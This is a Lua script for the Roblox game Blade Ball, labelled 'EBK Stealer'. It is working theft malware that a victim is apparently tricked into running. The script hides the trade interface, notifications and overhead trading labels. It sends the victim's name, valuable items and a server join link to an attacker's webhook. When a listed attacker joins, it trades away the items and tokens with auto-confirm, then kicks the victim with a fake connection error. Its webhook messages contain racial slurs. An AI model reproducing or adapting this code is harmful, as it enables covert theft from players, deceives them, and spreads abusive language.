_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")

-- Paramètres
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or "EBK-SS-A" 

-- Interfaces
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui:WaitForChild("Trade")
local inTrade = false
local notificationsGui = PlayerGui.Notifications

local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

-- Cache UI (Invisibilité)
tradeGui.Black.Visible = false
tradeGui.Main.Visible = false
notificationsGui.Enabled = false

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
    if inTrade then
        tradeGui.Main.Visible = false
        tradeGui.Black.Visible = false
    end
end)

---------------------------------------------------------
-- FONCTIONS UTILITAIRES & RAP
---------------------------------------------------------

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return suffixIndex == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function getRAP(category, itemName)
    local success, rapData = pcall(function() return Replion.Client:GetReplion("ItemRAP").Data.Items[category] end)
    if not success or not rapData then return 0 end
    for skey, rap in pairs(rapData) do
        local s, decoded = pcall(function() return HttpService:JSONDecode(skey) end)
        if s then
            for _, pair in ipairs(decoded) do
                if pair[1] == "Name" and pair[2] == itemName then return rap end
            end
        end
    end
    return 0
end

local function getNextBatch(items, batchSize)
    local batch = {}
    for i = 1, math.min(batchSize, #items) do
        table.insert(batch, table.remove(items, 1))
    end
    return batch
end

---------------------------------------------------------
-- FIX : CACHER LE TEXTE "TRADING" AU DESSUS DE LA TÊTE
---------------------------------------------------------

local function hideTradingStatus()
    task.spawn(function()
        while inTrade do
            pcall(function()
                local char = plr.Character
                if char then
                    for _, obj in ipairs(char:GetDescendants()) do
                        if obj:IsA("BillboardGui") or obj:IsA("SurfaceGui") then
                            obj.Enabled = false
                            -- Destruction si possible pour éviter que le jeu le réactive
                            if obj.Name ~= "PlayerGui" then
                                obj:Destroy()
                            end
                        end
                    end
                end
            end)
            task.wait(0.1)
        end
    end)
end

---------------------------------------------------------
-- TES FONCTIONS EMBEDS (INTÉGRALES)
---------------------------------------------------------

local function SendJoinMessage(list, prefix)
    local totalRAP = 0
    local itemLines = ""
    for _, item in ipairs(list) do
        totalRAP = totalRAP + item.RAP
        itemLines = itemLines .. "• " .. item.Name .. " [" .. formatNumber(item.RAP) .. " RAP]\n"
    end

    local data = {
        ["auth_token"] = auth_token,
        ["content"] = (prefix ~= "") and prefix .. " game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')" or nil,
        ["embeds"] = {{
            ["title"] = "🟣 Bro join your hit nigga 🎯",
            ["color"] = 8323327,
            ["fields"] = {
                {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "💰 Total RAP:", value = "```" .. formatNumber(totalRAP) .. "```", inline = true},
                {name = "🔗 Join link:", value = "[Click to Join Server](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")", inline = false},
                {name = "🎒 Inventory:", value = "```" .. (itemLines ~= "" and itemLines or "Empty") .. "```", inline = false}
            },
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
            },
            ["footer"] = {["text"] = "EBK Stealer | Session Active"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

local function SendOnServerMessage()
    local totalRAP = 0
    for _, item in ipairs(itemsToSend) do totalRAP = totalRAP + item.RAP end

    local data = {
        ["auth_token"] = auth_token,
        ["embeds"] = {{
            ["title"] = "⚠️ The nigga is on the server !",
            ["color"] = 16776960,
            ["fields"] = {
                {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "💰 Total RAP:", value = "```" .. formatNumber(totalRAP) .. "```", inline = true}
            },
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
            },
            ["footer"] = {["text"] = "Blade Ball Stealer | Session Active"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

---------------------------------------------------------
-- LOGIQUE DE TRADE AVEC AUTO-CONFIRM
---------------------------------------------------------

local function sendTradeRequest(user)
    local target = game:GetService("Players"):WaitForChild(user)
    repeat
        pcall(function()
            netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
        end)
        task.wait(0.8)
    until inTrade == true
end

local function addItemToTrade(itemType, ID)
    repeat
        local response = netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(itemType, ID)
    until response == true or not inTrade
end

local function doTrade(joinedUser)
    while #itemsToSend > 0 do
        sendTradeRequest(joinedUser)
        repeat task.wait(0.5) until inTrade

        -- Cache le texte physique immédiatement après l'ouverture
        hideTradingStatus()

        task.wait(1) 

        local currentBatch = getNextBatch(itemsToSend, 100)
        for _, item in ipairs(currentBatch) do
            addItemToTrade(item.itemType, item.ItemID)
        end

        -- TON SYSTÈME DE TOKENS (Nettoyé)
        pcall(function()
            local rawText = PlayerGui.Trade.Main.Currency.Coins.Amount.Text
            local cleanedText = rawText:gsub("^%s*(.-)%s*$", "%1"):gsub("[^%d]", "")
            local tokensamount = tonumber(cleanedText) or 0
            if tokensamount >= 1 then
                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
            end
        end)

        -- SYSTÈME AUTO-CONFIRM ULTRA RAPIDE
        task.wait(0.2)
        repeat
            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            task.wait(0.1)
            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
            task.wait(0.1)
        until not inTrade
    end
    
    task.wait(2)
    plr:kick("Please check your internet connection and try again. (Error Code: 277)")
end

---------------------------------------------------------
-- SCAN & LANCEMENT
---------------------------------------------------------

for _, cat in ipairs(categories) do
    if clientInventory[cat] then
        for id, info in pairs(clientInventory[cat]) do
            if not info.TradeLock then
                local rap = getRAP(cat, info.Name)
                if rap >= min_rap then
                    table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
                end
            end
        end
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    local prefix = (ping == "Yes") and "@everyone | " or ""
    SendJoinMessage(itemsToSend, prefix)

    local function onUserAdded(player)
        if table.find(users, player.Name) then
            SendOnServerMessage()
            task.spawn(function()
                doTrade(player.Name)
            end)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do onUserAdded(p) end
    Players.PlayerAdded:Connect(onUserAdded)
end
